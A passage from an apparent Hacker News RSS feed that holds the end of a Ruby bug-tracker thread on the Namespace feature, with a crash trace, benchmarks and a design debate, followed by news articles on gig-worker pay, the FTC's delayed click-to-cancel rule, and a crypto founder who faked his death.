/opt/rubies/head-namespaces/bin/ruby(load_iseq_eval+0x280) [0x104acb488]
/opt/rubies/head-namespaces/bin/ruby(require_internal+0x99c) [0x104ac90ac]
/opt/rubies/head-namespaces/bin/ruby(rb_require_string_internal+0x58) [0x104ac8320]
/opt/rubies/head-namespaces/bin/ruby(rb_f_require+0x44) [0x104ac81f0]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_call_alias+0x70) [0x104c19b38]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(vm_call0_body+0x470) [0x104c2482c]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_call_kw+0xd8) [0x104c0c660]
/opt/rubies/head-namespaces/bin/ruby(rb_call_super_kw+0x1bc) [0x104c0cbf0]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
/opt/rubies/head-namespaces/bin/ruby(rb_namespace_user_loading_func+0x80) [0x104ad7b0c]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
/opt/rubies/head-namespaces/bin/ruby(load_iseq_eval+0x280) [0x104acb488]
/opt/rubies/head-namespaces/bin/ruby(require_internal+0x99c) [0x104ac90ac]
/opt/rubies/head-namespaces/bin/ruby(rb_require_string_internal+0x58) [0x104ac8320]
/opt/rubies/head-namespaces/bin/ruby(rb_f_require+0x44) [0x104ac81f0]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_call_alias+0x70) [0x104c19b38]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(vm_call0_body+0x470) [0x104c2482c]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_call_kw+0xd8) [0x104c0c660]
/opt/rubies/head-namespaces/bin/ruby(rb_call_super_kw+0x1bc) [0x104c0cbf0]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
/opt/rubies/head-namespaces/bin/ruby(rb_namespace_user_loading_func+0x80) [0x104ad7b0c]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
/opt/rubies/head-namespaces/bin/ruby(load_iseq_eval+0x280) [0x104acb488]
/opt/rubies/head-namespaces/bin/ruby(require_internal+0x99c) [0x104ac90ac]
/opt/rubies/head-namespaces/bin/ruby(rb_require_string_internal+0x58) [0x104ac8320]
/opt/rubies/head-namespaces/bin/ruby(rb_f_require+0x44) [0x104ac81f0]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_call_alias+0x70) [0x104c19b38]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(vm_call0_body+0x470) [0x104c2482c]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_call_kw+0xd8) [0x104c0c660]
/opt/rubies/head-namespaces/bin/ruby(rb_call_super_kw+0x1bc) [0x104c0cbf0]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
/opt/rubies/head-namespaces/bin/ruby(rb_namespace_user_loading_func+0x80) [0x104ad7b0c]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
/opt/rubies/head-namespaces/bin/ruby(load_iseq_eval+0x280) [0x104acb488]
/opt/rubies/head-namespaces/bin/ruby(require_internal+0x99c) [0x104ac90ac]
/opt/rubies/head-namespaces/bin/ruby(rb_require_string_internal+0x58) [0x104ac8320]
/opt/rubies/head-namespaces/bin/ruby(rb_f_require+0x44) [0x104ac81f0]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_call_alias+0x70) [0x104c19b38]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(vm_call0_body+0x470) [0x104c2482c]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_call_kw+0xd8) [0x104c0c660]
/opt/rubies/head-namespaces/bin/ruby(rb_call_super_kw+0x1bc) [0x104c0cbf0]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
/opt/rubies/head-namespaces/bin/ruby(rb_namespace_user_loading_func+0x80) [0x104ad7b0c]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(rb_ec_exec_node+0x98) [0x104a6607c]
/opt/rubies/head-namespaces/bin/ruby(ruby_run_node+0x44) [0x104a65f9c]
/opt/rubies/head-namespaces/bin/ruby(main+0x68) [0x1049a4cc4]
</code></pre></div>
  
  <div id="change-113122"><p>Alright, so I can't benchmark with <code>RUBY_NAMESPACE=1</code> because I keep running into that crash and can't figure it out.<br>
In the process of trying to find a fix I found multiple other bugs:</p>
<ul>
<li><a href="https://github.com/tagomoris/ruby/pull/7">https://github.com/tagomoris/ruby/pull/7</a></li>
<li><a href="https://github.com/tagomoris/ruby/pull/6">https://github.com/tagomoris/ruby/pull/6</a></li>
<li><a href="https://github.com/tagomoris/ruby/pull/5">https://github.com/tagomoris/ruby/pull/5</a></li>
</ul>
<p>I still ran the benchmark again on a better machine (still not tuned for benchmarking though), and the results appear consistent.</p>
<p>Interpreter:</p>
<pre><code>master: ruby 3.5.0dev (2025-05-11T03:09:26Z master 49742414f6) +PRISM [arm64-darwin24]
last_commit=Revert "Fix redefinition of `clock_gettime` and `clock_getres`"
namespace-off: ruby 3.5.0dev (2025-05-11T08:53:41Z byroot-namespace 20e6177509) +PRISM [arm64-darwin24]

--------------  -----------  ----------  ------------------  ----------  ---------------------  --------------------
bench           master (ms)  stddev (%)  namespace-off (ms)  stddev (%)  namespace-off 1st itr  master/namespace-off
activerecord    153.4        1.7         154.5               1.1         0.996                  0.993               
chunky-png      423.8        1.0         421.2               1.3         1.007                  1.006               
erubi-rails     664.6        1.1         699.1               1.2         0.887                  0.951               
hexapdf         1132.1       3.7         1150.5              1.1         0.972                  0.984               
liquid-c        26.5         4.2         27.7                3.7         0.745                  0.957               
liquid-compile  27.0         3.0         27.0                2.5         0.998                  0.999               
liquid-render   70.5         2.7         72.9                1.7         0.914                  0.967               
lobsters        476.1        0.8         483.7               1.2         1.004                  0.984               
mail            78.0         14.0        69.9                3.4         0.904                  1.115               
psych-load      1103.7       0.6         1107.9              0.6         0.977                  0.996               
railsbench      1058.7       0.8         1073.4              1.3         0.978                  0.986               
rubocop         83.7         1.8         86.7                3.0         0.986                  0.965               
ruby-lsp        89.8         2.2         89.6                1.2         1.005                  1.002               
sequel          28.2         2.5         28.7                2.7         0.981                  0.980               
--------------  -----------  ----------  ------------------  ----------  ---------------------  --------------------
Legend:
- namespace-off 1st itr: ratio of master/namespace-off time for the first benchmarking iteration.
- master/namespace-off: ratio of master/namespace-off time. Higher is better for namespace-off. Above 1 represents a speedup.
</code></pre>
<p>YJIT:</p>
<pre><code>master: ruby 3.5.0dev (2025-05-11T03:09:26Z master 49742414f6) +YJIT +PRISM [arm64-darwin24]
last_commit=Revert "Fix redefinition of `clock_gettime` and `clock_getres`"
namespace-off: ruby 3.5.0dev (2025-05-11T08:53:41Z byroot-namespace 20e6177509) +YJIT +PRISM [arm64-darwin24]

--------------  -----------  ----------  ------------------  ----------  ---------------------  --------------------
bench           master (ms)  stddev (%)  namespace-off (ms)  stddev (%)  namespace-off 1st itr  master/namespace-off
activerecord    65.3         1.7         69.2                1.9         0.914                  0.942               
chunky-png      236.2        2.3         230.5               1.4         0.998                  1.025               
erubi-rails     321.8        1.5         357.1               2.2         0.830                  0.901               
hexapdf         593.2        3.7         600.0               3.2         0.980                  0.989               
liquid-c        19.5         3.2         20.4                3.2         0.965                  0.953               
liquid-compile  19.0         3.5         19.2                3.4         0.936                  0.989               
liquid-render   28.6         2.7         28.8                4.1         1.014                  0.991               
lobsters        317.0        2.4         326.0               2.3         0.926                  0.972               
mail            53.2         17.3        53.3                15.7        1.005                  0.998               
psych-load      651.3        0.9         666.8               0.5         0.978                  0.977               
railsbench      536.3        1.5         550.5               2.0         1.005                  0.974               
rubocop         52.9         6.6         53.2                5.6         0.995                  0.994               
ruby-lsp        47.7         1.8         49.6                4.0         0.990                  0.962               
sequel          23.1         2.7         23.7                3.1         0.914                  0.974               
--------------  -----------  ----------  ------------------  ----------  ---------------------  --------------------
Legend:
- namespace-off 1st itr: ratio of master/namespace-off time for the first benchmarking iteration.
- master/namespace-off: ratio of master/namespace-off time. Higher is better for namespace-off. Above 1 represents a speedup.
</code></pre></div>
  
  <div id="change-113123"><p><a href="https://bugs.ruby-lang.org/users/7941">@byroot (Jean Boussier)</a> Thank you for working on the feature. I'll merge the patches soon (had merged one already).<br>
About the crash with <code>RUBY_NAMESPACE=1</code>, I'll work on it ASAP after merging the branch once.</p>
<p>I know that the 3-5% performance degradation is not small, especially for the very large workload (like Shopify). But, for now, I want to merge the branch once and then try to find performance problems I added (except for the case Matz say "stop!"). I can't maintain my branch only by myself (with so many continuous rebases) for a long time.</p></div>
  
  <div id="change-113124"><p>Some of the issues I have noted seem to be addressable and have been added to the TODO. (I have written tickets for them.)</p>
<p>But there is <a href="https://bugs.ruby-lang.org/issues/21322">one</a> that seems fundamental and worries me. Since this ticket is alive, I'd like to raise awareness of it.</p>
<p>Let's do this thought experiment, in which we imagive <code>c.rb</code> defines a class <code>C</code> with a class method <code>x</code>:</p>
<pre><code data-language="ruby"><span>ns</span> <span>=</span> <span>Namespace</span><span>.</span><span>new</span>
<span>ns</span><span>.</span><span>require</span><span>(</span><span>'c'</span><span>)</span>
<span>ns</span><span>::</span><span>C</span><span>.</span><span>x</span><span>(</span><span>Object</span><span>)</span>
</code></pre>
<p>Now, there are two conflicting options here:</p>
<ol>
<li>
<p>If the method receives the passed object reference as usual (remember, <code>Object</code> is a constant that evaluates to an object), then within <code>x</code> the value returned by <code>Object</code> in the namespace and the method argument have the same object ID, but different state (<code>constants</code> may give different lists, for example).</p>
</li>
<li>
<p>Alternatively, the method invocation internally swaps the passed object reference with the one with the same ID in the namespace (so to speak), and <code>x</code> <strong>does not</strong> receive the object passed by the caller. You have a method call that does not pass what you pass.</p>
</li>
</ol>
<p>Both (1) and (2) break the current semantics of Ruby. ((2) is what happens, though I do not know if that is deliberate or a side-effect of the implementation.)</p>
<p>It is the combination of isolation + constant access outside the namespace + method call semantics that I find difficult to reconcile (does not mean it is impossible with newly introduced rules).</p></div>
  
  <div id="change-113128"><p>@fxn I'm unsure I correctly understand what you mean... Let me check your point.</p>
<p>You said:</p>
<ul>
<li>The current namespace implementation behaves like (2), not (1).</li>
<li>The passed value to <code>ns::C.x</code> (in the callee namespace side) will be a different (copied) object from Object in the caller namespace.</li>
</ul>
<p>Is that correctly what you mean?</p>
<p>My answer: Namespace behaves like (1), not (2).</p>
<p><a href="https://github.com/tagomoris/ruby/blob/namespace-on-read-classext/doc/namespace.md#builtin-classes-referred-via-namespace-objects">https://github.com/tagomoris/ruby/blob/namespace-on-read-classext/doc/namespace.md#builtin-classes-referred-via-namespace-objects</a><br>
As I noted on the section above, <code>Object</code> is the Object class object in any namespaces. When it is patched (added a constant, added a method, etc) in a namespace, the backed rb_classext_t (it's not a object itself, it's a set of "state" in your vocabulary) will be copied. But the Object-class object itself is not copied, just be passed.</p>
<p>(1) breaks the current semantics of Ruby. Yes, namespace is a new idea to change the semantics.</p></div>
  
  <div id="change-113129"><p><a href="https://bugs.ruby-lang.org/users/1855">@tagomoris (Satoshi Tagomori)</a> From the point of view of the Ruby programmer, I have an object, I pass it, and the callee receives a different object. To me, that is (2). Somehow, the object itself has mutated.</p>
<p>We are not talking about constant lookup in the namespace. Or about the value the <code>Object</code> constant evaluates to in a namespace.</p>
<p>We are talking about object references crossing namespaces via method calls.</p>
<p>I send you an object, and you get a different object.</p>
<p>As I said in the ticket, that object could be in some attribute three levels down in the object tree of your user-level class instance.</p>
<p>In the namespace examples, sure</p>
<pre><code data-language="ruby"><span>ns</span><span>::</span><span>String</span><span>.</span><span>foo</span> <span># NoMethodError</span>
</code></pre>
<p>but there is a constant lookup there that we all understand retrieves a different object (in an observable meaning) from within the namespace.</p></div>
  
  <div id="change-113130">
    
    

    <p><a href="https://bugs.ruby-lang.org/users/1855">@tagomoris (Satoshi Tagomori)</a> when I said that (1) would break Ruby semantics I meant that <strong>in the same namespace</strong> you would have two objects with the same ID and different state. That does not happen as far as I can tell.</p>
    </div>
  
  <div id="change-113131"><p>fxn (Xavier Noria) wrote in <a href="#note-68">#note-68</a>:</p>
<blockquote>
<p><a href="https://bugs.ruby-lang.org/users/1855">@tagomoris (Satoshi Tagomori)</a> when I said that (1) would break Ruby semantics I meant that <strong>in the same namespace</strong> you would have two objects with the same ID and different state. That does not happen as far as I can tell.</p>
</blockquote>
<p>That should not happen, and if it happens, it's a bug. Could you write and show the script to reproduce it?</p></div>
  
  <div id="change-113132"><blockquote>
<p>That should not happen, and if it happens, it's a bug. Could you write and show the script to reproduce it?</p>
</blockquote>
<p>Exactly, as far as I can tell it does not happen, which to me it means we do not have (1) in place.</p>
<p>It was a way to say that, from my perspective, we have (2) in place.</p>
<p>Maybe you have the C code in your head, I am looking at it as a Ruby programmer would. I have one object reference, and I pass it in method call, no namespace-level constant resolution involved in the callee.</p>
<p>See what I mean?</p></div>
  
  <div id="change-113133"><p>fxn (Xavier Noria) wrote in <a href="#note-70">#note-70</a>:</p>
<blockquote>
<p>Maybe you have the C code in your head, I am looking at it as a Ruby programmer would. I have one object reference, and I pass it in method call, no namespace-level constant resolution involved in the callee.</p>
<p>See what I mean?</p>
</blockquote>
<p>No, I can't.</p>
<p>What I understand as a Ruby programmer (me), Class object is just an object like other objects, referred either constant resolution or passing value (as a method argument). We can check the object equality by object id.<br>
And, - this part is the new paradigm Namespace introduced -, an object, crossing namespaces from A to B, is just an object (because object id is not changed before/after), but may have different sets of definitions (constants, ivars, methods, etc) in A and B.</p>
<p>Actually, it's not so big change because we have refinements. When <code>using X</code> happens, objects can have different sets of methods. Namespace expands it to constants, class ivars, include/extend and others.</p></div>
  
  <div id="change-113134"><p>Example:</p>
<pre><code data-language="ruby"><span># main.rb</span>

<span>class</span> <span>C</span>
  <span>attr_reader</span> <span>:target</span>

  <span>def</span> <span>initialize</span><span>(</span><span>target</span><span>)</span>
    <span>@target</span> <span>=</span> <span>target</span>
  <span>end</span>
<span>end</span>

<span>ns</span> <span>=</span> <span>Namespace</span><span>.</span><span>new</span>
<span>ns</span><span>.</span><span>require_relative</span> <span>'foo'</span>

<span>c</span> <span>=</span> <span>C</span><span>.</span><span>new</span><span>(</span><span>Object</span><span>)</span>
<span>ns</span><span>::</span><span>Foo</span><span>.</span><span>new</span><span>.</span><span>m</span><span>(</span><span>c</span><span>)</span>

<span># foo.rb</span>

<span>class</span> <span>Foo</span>
  <span>def</span> <span>m</span><span>(</span><span>c</span><span>)</span>
    <span>(</span><span>c</span><span>.</span><span>target</span><span>)</span><span>::</span><span>C</span> <span># NameError</span>
  <span>end</span>
<span>end</span>
</code></pre>
<p>That raises.</p>
<p>The object tree of my <code>c</code> instance has somehow been altered in the method call.</p>
<p>I believe I understand what you have in mind, eh? Only I believe the docs should explain this so that users can understand these consequences, and wanted to make sure everyone is aware of this.</p>
<p>We can continue <a href="https://bugs.ruby-lang.org/issues/21322">in the ticket</a> if you will :).</p></div>
  
  <div id="change-113137"><blockquote>
<p>wanted to make sure everyone is aware of this</p>
</blockquote>
<p>What I want all in the thread to realize is that if somewhere in the tree of your object, some code relies on a core extension, that object is automatically not cross-namespace-safe, and you may not even know it.</p>
<p>Together with the design allowing to mix instances of different versions of the same gem, makes this particular aspect of the feature questionable, for me.</p>
<p>If this behavior stays, I'll volunteer a doc patch.</p></div>
  
  <div id="change-113146">
    
    

    <ul>
       <li><strong>Status</strong> changed from <i>Open</i> to <i>Closed</i></li>
       <li><strong>Assignee</strong> set to <i>tagomoris (Satoshi Tagomori)</i></li>
       <li><strong>Target version</strong> set to <i>3.5</i></li>
    </ul>
    <p>I've merged the change into master. So, let me close this issue.<br>
Please open another ticker for further problems, issues, bugs, etc.</p>
    </div>
  
  <div id="change-113147"><blockquote>
<p>Please open another ticker for further problems, issues, bugs, etc.</p>
</blockquote>
<p>Right now <code>RUBY_NAMESPACE=1 make -j btest</code> fails, are you actively working on adding a CI step that run with <code>RUBY_NAMESPACE=1</code> or should I open another ticket to track this? I would have assume it would have been part of this ticket.</p></div>
  
  <div id="change-113148">
    
    

    <ul>
       <li><strong>Status</strong> changed from <i>Closed</i> to <i>Open</i></li>
    </ul>
    <div id="journal-113148-notes"><p>byroot (Jean Boussier) wrote in <a href="#note-75">#note-75</a>:</p>
<blockquote>
<blockquote>
<p>Please open another ticker for further problems, issues, bugs, etc.</p>
</blockquote>
<p>Right now <code>RUBY_NAMESPACE=1 make -j btest</code> fails, are you actively working on adding a CI step that run with <code>RUBY_NAMESPACE=1</code> or should I open another ticket to track this? I would have assume it would have been part of this ticket.</p>
</blockquote>
<p>I had a plan to add CI configuration to add <code>RUBY_NAMESPACE=1</code> checks and I thought it would not be a part of this. But yes, it should be. I'll close this ticket after adding checks.</p></div>
    </div>
  

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Gig Companies Violate Workers Rights (138 pts)]]></title>
            <link>https://www.hrw.org/news/2025/05/12/us-major-companies-violate-gig-workers-rights</link>
            <guid>43962535</guid>
            <pubDate>Mon, 12 May 2025 13:13:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.hrw.org/news/2025/05/12/us-major-companies-violate-gig-workers-rights">https://www.hrw.org/news/2025/05/12/us-major-companies-violate-gig-workers-rights</a>, See on <a href="https://news.ycombinator.com/item?id=43962535">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      



<p>(Washington, DC) – Major digital labor platforms, also known as gig companies, operating in the&nbsp;<a href="https://www.hrw.org/united-states">United States</a> misclassify gig workers as independent contractors, denying them labor rights, Human Rights Watch said in a report released today.</p><p>The 155-page <a href="https://www.hrw.org/node/391214">report</a>, “‘The Gig Trap’: Algorithmic, Wage and Labor Exploitation in Platform Work in the US” focuses on seven major companies operating in the US: Amazon Flex, DoorDash, Favor, Instacart, Lyft, Shipt, and Uber. These companies claim to offer gig workers “flexibility” but often end up paying them less than state or local minimum wages. Six of the seven companies use algorithms with opaque rules to assign jobs and determine wages, meaning that workers do not know how much they will be paid until after completing the job.</p>  



<p>“Digital labor platforms have created a business model that evades employer responsibilities while keeping workers under tight algorithmic control, driven by opaque and unpredictable decisions,” said&nbsp;<a href="https://www.hrw.org/about/people/lena-simet">Lena Simet</a>, senior researcher on poverty and inequality at Human Rights Watch. “They promise flexibility but, in reality, they leave workers at the mercy of unstable and subminimum wages, little social protection, and in constant fear of termination without recourse.”</p><p>Workers for the seven platforms examined are assigned orders, supervised, paid, and fired by algorithms. All except Amazon Flex, which uses a flat hourly wage, use opaque and frequently changing algorithms to calculate pay per job or shift. Apps and platforms are designed to keep gig workers on the job for long hours and low pay, and dynamic pricing algorithms make it extremely difficult for them to plan their schedules and manage their earnings. Managed by algorithms, workers cannot fully understand how they are assigned work, or how their wages are calculated. Without any transparency, it’s extremely difficult for them to challenge decisions made about their work or pay.</p><p>Human Rights Watch examined the working conditions of ride-hailing, shopping, and food delivery workers, with a focus on Texas. The report is based on semi-structured interviews with 95 platform workers in Texas and 12 other US states, as well as a survey of 127 workers in Texas.</p><p>Low wages, algorithmic control and barriers to unionizing trap many workers in economic insecurity, even as multi-billion-dollar companies expand their market share and revenue, Human Rights Watch found.</p><p>Weak regulations allow these companies to misclassify workers as independent contractors rather than employees, despite the nature of the work and degree of control exercised by the companies often meeting legal criteria for employee status. This enables companies to avoid compliance with minimum wage laws, overtime pay, and contributions to nonwage benefits. For workers, it means providing their own vehicles, fuel, insurance, and maintenance as well as paying the employer’s share of Social Security and Medicare contributions.</p><p>The Texas workers surveyed earned nearly 30 percent below the federal minimum wage and about 70 percent below what the Massachusetts Institute of Technology estimates is a living wage in Texas. These findings reinforce those of&nbsp;<a href="https://www.nyc.gov/assets/dca/downloads/pdf/workers/Delivery-Worker-Study-November-2022.pdf">local governments</a>,&nbsp;<a href="https://irle.berkeley.edu/a-minimum-compensation-standard-for-seattle-ridehail-drivers/%20(accessed%20August%2020,%202024).%20https:/irle.berkeley.edu/a-minimum-compensation-standard-for-seattle-ridehail-drivers/">academic institutions</a>, and&nbsp;<a href="https://lep.illinois.edu/wp-content/uploads/2022/03/ILEPI-PMCR-Improving-Labor-Standards-for-Uber-and-Lyft-Drivers-FINAL.pdf">policy researchers</a>, who have consistently found that these workers earn at or below local minimum wages and well below the thresholds needed for a decent standard of living.</p><p>The US is home to one of the largest global markets for digital platform work, and the number of people earning income from gig work has surged in recent years.&nbsp;<a href="https://www.pewresearch.org/internet/2021/12/08/the-state-of-gig-work-in-2021/">Estimates suggest that by 2021</a>, 16 percent of US adults had worked for a digital labor platform at least once. Platform workers are disproportionately Black or Latinx and live in lower income households.</p><p>Workers who responded to the Human Rights Watch survey received an average of US$16.90 per hour (including tips), but nearly half of that was spent on work-related expenses. After accounting for nonwage benefits that employers often cover for other workers, their effective pay fell to $5.12 per hour. Some workers reported earning nothing at all after expenses.</p>



<p>Three-quarters of surveyed workers said they struggled to pay for housing in the last year, and most reported difficulty paying for food, groceries, electricity, and water. More than one-third said they would not be able to cover a $400 emergency expense.</p><p>Workers told Human Rights Watch they lived in near-constant fear of being “deactivated” or fired by an app, often without explanation or recourse. Nearly half of those who had been automatically fired were later cleared of wrongdoing, suggesting a high rate of erroneous account deactivations.</p>



<p>The financial insecurity of platform workers stands in stark contrast to the soaring revenues of the companies themselves. Uber, which&nbsp;<a href="https://companiesmarketcap.com/uber/marketcap/">holds</a> a 76 percent share of the US rideshare market,&nbsp;<a href="https://investor.uber.com/news-events/news/press-release-details/2025/Uber-Announces-Results-for-Fourth-Quarter-and-Full-Year-2024/default.aspx">reported</a> $43.9 billion in revenue in 2024, a 17.96 percent increase from the previous year, and a net income of $9.8 billion. As of April 2025, Uber has a market capitalization of $169.41 billion. DoorDash, with 67 percent of the US food delivery market,&nbsp;<a href="https://companiesmarketcap.com/doordash/marketcap/#google_vignette">recorded</a> $10.72 billion in revenue in 2024 and as of April 2025 was valued at $81.03 billion.</p><p>By misclassifying workers as independent contractors, platform companies also avoid contributing to Social Security, Medicare, and unemployment insurance, depriving public funds of critical resources. Based on tax data from the Census Bureau’s Nonemployer Statistics, Human Rights Watch estimates that Texas could have collected over $111 million in unemployment insurance contributions between 2020 and 2022 from platform companies if rideshare, delivery, and in-home platform workers had been classified as employees. The actual shortfall is likely much higher when accounting for unreported income.</p><p>In response to Human Rights Watch’s request for comment, Lyft said: “App-based work provides millions of Americans uniquely flexible work opportunities, leaving room for them to meet other goals, commitments, or obligations. It allows them to work around their many real and unpredictable commitments and their busy schedules in ways that traditional 9-5 jobs don’t provide.” Amazon met with Human Rights Watch to discuss the report but did not give an on record response. The other companies did not reply.</p><p>International human rights law requires just and favorable working conditions for all workers, including workers for digital platforms.</p><p>The US Department of Labor, the Federal Trade Commission, the Texas Workforce Commission, and equivalent agencies in other states should take immediate steps to ensure workplace safety for gig workers and protect their rights to unionize, Human Rights Watch said.</p><p>“Digital labor platforms have created a workforce with none of the rights and protections that workers have fought for over decades,” Simet said. “As more people are drawn to platform work to make ends meet, federal and state authorities should step up to guarantee them the protections they are entitled to, and should work with the International Labour Organization to establish a binding global standard for platform work.”</p>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The FTC puts off enforcing its 'click-to-cancel' rule (290 pts)]]></title>
            <link>https://www.theverge.com/news/664730/ftc-delay-click-to-cancel-rule</link>
            <guid>43962528</guid>
            <pubDate>Mon, 12 May 2025 13:12:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/news/664730/ftc-delay-click-to-cancel-rule">https://www.theverge.com/news/664730/ftc-delay-click-to-cancel-rule</a>, See on <a href="https://news.ycombinator.com/item?id=43962528">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p><img alt="Wes Davis" data-chromatic="ignore" loading="lazy" width="36" height="36" decoding="async" data-nimg="1" srcset="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/196306/unnamed.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=48 1x, https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/196306/unnamed.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=96 2x" src="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/196306/unnamed.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=96"></p><p><a href="https://www.theverge.com/authors/wes-davis">Wes Davis</a> <span>is a weekend editor who covers the latest in tech and entertainment. He has written news, reviews, and more as a tech journalist since 2020.</span></p></div><div id="zephr-anchor"><p>The Federal Trade Commission (FTC) was set to start enforcing the remaining provisions of its “click-to-cancel” rule on May 14th, requiring that subscriptions be as easy to cancel as to start. Now, <a href="https://www.ftc.gov/system/files/ftc_gov/pdf/negative-option-rule-delay-commission-statement.pdf">the agency says</a> it won’t enforce the rule until July 14th, as <a href="https://techcrunch.com/2025/05/10/ftc-delays-enforcement-of-click-to-cancel-rule/"><em>TechCrunch </em>reports</a>.</p><p>Also known as the Negative Option Rule, the big component of click-to-cancel is that it forbids companies from making customers jump through hoops that differ from the process to sign up for an account. If you can sign up online, you must be able to cancel online, too. As the FTC points out, the original May 14th deadline was already a deferral for that and related provisions.</p><p>The agency says it chose to push enforcement back even further after “a fresh assessment of the burdens that forcing compliance by this date would impose.” The FTC voted 3-0 for the delay, but as <em>TechCrunch</em> notes, two of a typical five commissioners were absent from the vote. That’s because they were <a href="https://www.theverge.com/news/632267/democratic-ftc-commissioners-alvaro-bedoya-rebecca-kelly-slaughter-illegally-fired-trump">illegally fired by Donald Trump</a> in March.</p><p>Perhaps on the bright side for consumers, the FTC says that starting on the new deadline, “regulated entities must be in compliance with the whole of the Rule because the Commission will begin enforcing it.” However, it doesn’t rule out changing any of the regulation’s provisions, writing that it’s “open to amending the Rule” if enforcing it “exposes any problems.”</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A crypto founder faked his death. We found him alive at his dad's house (144 pts)]]></title>
            <link>https://sfstandard.com/2025/05/08/jeffy-yu-zerebro-fake-death/</link>
            <guid>43962503</guid>
            <pubDate>Mon, 12 May 2025 13:07:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sfstandard.com/2025/05/08/jeffy-yu-zerebro-fake-death/">https://sfstandard.com/2025/05/08/jeffy-yu-zerebro-fake-death/</a>, See on <a href="https://news.ycombinator.com/item?id=43962503">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><div id=""><p>Jeffy Yu was days away from his 23rd birthday when he appeared to take his own life Sunday in a video. A flattering obituary appeared, calling the aspiring crypto mogul “a visionary artist, technologist, and cultural force” and “a tech prodigy from an early age.” A memecoin in Yu’s honor went up for sale.</p><p>But in the days that followed, online sleuths raised doubts about the video’s authenticity. The obituary disappeared. Whatever deceptive game was being played came to an indisputable end when The Standard found Yu on Wednesday, holed up at his parents’ Crocker-Amazon home.</p></div><p>Standing outside the two-story house, the supposedly gifted tech developer was agitated and shocked that he had been found after some routine internet searches.</p><p>“I’ve been doxxed. I’ve been harassed. If you can find me, other people can find me,” he said. “Now I have to move my parents out of here this week.”</p><p>Yu is the developer of Zerebro, an obscure cryptocurrency token with a <a href="https://finance.yahoo.com/quote/ZEREBRO-USD/">market capitalization of $44 million</a>. (Bitcoin, by comparison, has a market cap of $2 trillion.) Zerebro was little known until videos of Yu appearing to shoot himself began circulating early Sunday. </p><p>Some online spectators speculated the video came from a livestream on the pump.fun cryptocurrency platform, but a spokesperson 